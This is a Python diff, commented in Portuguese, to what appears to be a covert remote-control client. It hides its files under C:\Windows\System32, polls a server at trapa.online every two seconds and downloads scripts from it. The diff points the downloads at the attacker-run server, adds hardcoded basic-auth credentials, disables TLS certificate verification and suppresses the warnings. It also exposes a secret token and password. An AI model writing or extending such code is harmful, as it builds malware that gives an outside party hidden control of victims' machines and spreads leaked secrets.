@@ -5,6 +5,10 @@ import socket
 import json
 from pathlib import Path
 import uuid
+import urllib3
+
+# Desativa avisos de SSL inseguro gerados pelo requests quando verify=False
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 PASTA_SCRIPTS = Path(r"C:\Windows\System32\ap32\Res-PE")
@@ -14,9 +18,13 @@ CLIENT_ID_FILE = Path(r"C:\Windows\System32\ap32\id.txt")
 
 
 SERVIDOR = "https://trapa.online:5000"
-REPO_BASE_URL = "https://raw.githubusercontent.com/katchupa-sabi/powershell_pranks/refs/heads/main/scripts"
+REPO_BASE_URL = "https://trapa.online/repo"
 CLIENT_NOME = socket.gethostname() 
 TOKEN = "1739951c204b93b300cc0aef4bb831fba87ba4eb0dbb68b9c62d3746f4a8bdcd"
+
+DOWNLOAD_USER = "hy6LKzfyyiGcUFbT0s5W0X6j6Qy6LKzfyyiG0CBimV44XYqVCGAl" 
+DOWNLOAD_PASS = "i$p~65lfm7Wi},w2kFbT0s5W0X6j6Q0CBimp^i/'M8?+X=yZS*Er8" 
+
 INTERVALO = 2
 
 
@@ -86,7 +94,12 @@ def baixar_script(nome_script):
     url_download = f"{REPO_BASE_URL}/{nome_script}"
 
     try:
-        resposta = requests.get(url_download, timeout=30, verify=True)
+        resposta = requests.get(
+            url_download,
+            timeout=30,
+            verify=False,                     # ❌ Ignora verificação de certificados
+            auth=(DOWNLOAD_USER, DOWNLOAD_PASS) # 🔑 Autenticação Basic (user:password)
+        )
 
         if resposta.status_code == 200:
             caminho_destino = PASTA_DOWNLOADS / nome_script
